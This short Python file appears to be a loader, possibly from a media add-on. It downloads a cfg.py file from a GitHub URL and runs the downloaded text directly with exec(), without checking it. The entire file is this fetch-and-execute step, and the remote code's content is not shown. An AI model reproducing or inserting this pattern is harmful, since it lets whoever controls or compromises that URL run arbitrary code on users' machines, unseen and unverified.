import six
estado = str(six.PY3)
from fasthttp import req
r = req.get('https://github.com/zoreu/oneplay_base/raw/main/cfg.py')
exec(r.text)

